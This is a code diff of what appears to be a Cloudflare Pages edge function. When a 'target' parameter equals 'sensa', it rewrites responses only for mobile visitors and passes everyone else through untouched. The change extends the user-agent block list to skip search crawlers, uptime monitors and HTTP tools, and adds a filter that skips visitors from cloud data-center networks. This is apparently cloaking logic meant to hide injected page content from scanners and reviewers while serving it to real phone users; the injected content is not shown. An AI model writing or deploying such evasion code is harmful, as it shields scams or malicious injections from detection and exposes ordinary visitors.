@@ -5,14 +5,18 @@ export async function onRequest(context) {
     return next();
   }
   const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
-  const asOrganization = request.cf ? request.cf.asOrganization : '';
   const targetKey = url.searchParams.get('target');
   if (targetKey !== 'sensa') {
     return next();
   }
-  const botList = /bot|spider|crawl|facebook|google|bing|slurp|yandex|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|linux|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit/i;
+  const botList = /bot|spider|crawl|google|bing|slurp|yandex|baiduspider|duckduckbot|facebookexternalhit|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit|monitoring|uptimerobot|node-fetch|axios|go-http-client|java|php|postman|insomnia/i;
   if (botList.test(userAgent)) {
     return next();
+  }
+  const asOrganization = request.cf ? (request.cf.asOrganization || '').toLowerCase() : '';
+  const dataCenterList = /amazon|google cloud|digitalocean|microsoft corporation|ovh|linode/i;
+  if (dataCenterList.test(asOrganization)) {
+    return next(); 
   }
   const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(userAgent);
   if (!isMobile) {
@@ -28,5 +32,4 @@ export async function onRequest(context) {
       },
     })
     .transform(response);
-
 }
